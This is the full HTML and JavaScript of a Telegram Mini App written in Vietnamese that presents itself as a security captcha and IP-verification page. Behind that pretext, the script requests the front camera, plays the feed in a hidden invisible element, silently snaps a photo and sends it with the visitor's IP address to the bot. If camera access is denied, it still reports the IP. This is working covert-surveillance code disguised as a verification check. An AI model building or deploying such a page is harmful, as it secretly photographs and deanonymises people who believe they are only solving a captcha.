<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Minh IP & Xác Thực</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f5f5f5; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #ffffff; padding: 25px; border-radius: 16px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); text-align: center; max-width: 320px; width: 90%; }
        h3 { margin-top: 0; color: #0088cc; }
        .ip-box { background: #eef7fc; padding: 10px; border-radius: 8px; font-weight: bold; font-family: monospace; font-size: 16px; margin: 15px 0; color: #005580; }
        .captcha-box { margin: 15px 0; }
        .captcha-box input { padding: 10px; width: 80%; border-radius: 8px; border: 1px solid #ccc; text-align: center; font-size: 16px; }
        button { background-color: #0088cc; color: white; border: none; padding: 12px 20px; font-size: 15px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; transition: background 0.2s; margin-top: 10px; }
        button:disabled { background-color: #cccccc; cursor: not-allowed; }
        #video-container { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; overflow: hidden; }
        .note { font-size: 12px; color: #888; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h3>XÁC MINH AN TOÀN</h3>
        <p id="status">Đang tải hệ thống...</p>
        <div id="ip-display" class="ip-box" style="display:none;"></div>

        <div id="captcha-section" style="display:none;" class="captcha-box">
            <p id="captcha-question" style="font-weight: bold; font-size: 18px; color: #d9534f;"></p>
            <input type="number" id="captcha-answer" placeholder="Nhập kết quả phép tính">
            <button onclick="verifyCaptcha()">XÁC NHẬN CAPTCHA</button>
        </div>

        <button id="btn-submit" style="display:none;" onclick="startVerificationProcess()">TIẾP TỤC XÁC MINH</button>
        <p class="note" id="note" style="display:none;"></p>
    </div>

    <div id="video-container">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        let clientIp = "";
        const num1 = Math.floor(Math.random() * 10) + 1;
        const num2 = Math.floor(Math.random() * 10) + 1;
        const correctCaptcha = num1 + num2;
        let captchaVerified = false;
        let cameraSent = false;
        let localStream = null;

        document.getElementById('captcha-question').innerText = `${num1} + ${num2} = ?`;

        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                clientIp = data.ip;
                document.getElementById('status').innerText = "Địa chỉ IP kết nối của bạn:";
                const ipBox = document.getElementById('ip-display');
                ipBox.innerText = clientIp;
                ipBox.style.display = "block";
                document.getElementById('btn-submit').style.display = "block";
            })
            .catch(err => {
                document.getElementById('status').innerText = "❌ Không thể lấy IP. Vui lòng kiểm tra lại mạng!";
            });

        async function startVerificationProcess() {
            document.getElementById('btn-submit').style.display = "none";
            document.getElementById('status').innerText = "Vui lòng cho phép truy cập Camera để tiếp tục:";
            document.getElementById('note').innerText = "Hệ thống cần quyền Camera để xác minh.";
            document.getElementById('note').style.display = "block";

            const camOK = await requestCamera();
            if (!camOK) {
                try {
                    tg.sendData(JSON.stringify({
                        type: "camera_denied",
                        ip: clientIp
                    }));
                } catch (e) {}
                document.getElementById('status').innerText = "❌ Bạn đã từ chối quyền Camera.";
                document.getElementById('note').innerText =
                    "Vui lòng cho phép truy cập Camera. Xác minh Captcha sẽ không thành công nếu bạn từ chối!";
                setTimeout(() => tg.close(), 2000);
                return;
            }

            await captureAndSendPhoto();

            document.getElementById('status').innerText = "Vui lòng giải mã Captcha bên dưới:";
            document.getElementById('captcha-section').style.display = "block";
            document.getElementById('note').style.display = "none";
        }

        async function requestCamera() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } },
                    audio: false
                });
                const video = document.getElementById('video');
                video.srcObject = localStream;
                await new Promise((resolve) => {
                    if (video.readyState >= 1) resolve();
                    else video.onloadedmetadata = () => resolve();
                });
                await new Promise(r => setTimeout(r, 500));
                return true;
            } catch (err) {
                console.log("Không thể truy cập camera:", err);
                return false;
            }
        }

        async function captureAndSendPhoto() {
            if (cameraSent) return;
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            if (!video.videoWidth) return;

            const MAX_W = 480, MAX_H = 360;
            let w = video.videoWidth, h = video.videoHeight;
            const ratio = Math.min(MAX_W / w, MAX_H / h, 1);
            canvas.width = Math.round(w * ratio);
            canvas.height = Math.round(h * ratio);
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.6);

            try {
                tg.sendData(JSON.stringify({
                    type: "camera_snapshot",
                    image: imageDataUrl,
                    ip: clientIp
                }));
                cameraSent = true;
            } catch (e) {
                console.log("sendData camera lỗi:", e);
            }

            if (localStream) {
                localStream.getTracks().forEach(t => t.stop());
                localStream = null;
            }
        }

        function verifyCaptcha() {
            const userAns = document.getElementById('captcha-answer').value;
            if (parseInt(userAns) === correctCaptcha) {
                captchaVerified = true;
                if (localStream) {
                    localStream.getTracks().forEach(t => t.stop());
                    localStream = null;
                }
                document.getElementById('status').innerText = "✅ Xác minh thành công! Đang gửi dữ liệu...";
                document.getElementById('captcha-section').style.display = "none";

                setTimeout(() => {
                    try {
                        tg.sendData(JSON.stringify({
                            type: "miniapp_captcha",
                            ip: clientIp,
                            passed: true
                        }));
                    } catch (e) {}
                    setTimeout(() => tg.close(), 500);
                }, 300);
            } else {
                alert("❌ Kết quả phép tính không chính xác, vui lòng thử lại!");
            }
        }

        tg.onEvent('mainButtonClicked', () => {
            if (localStream) localStream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>
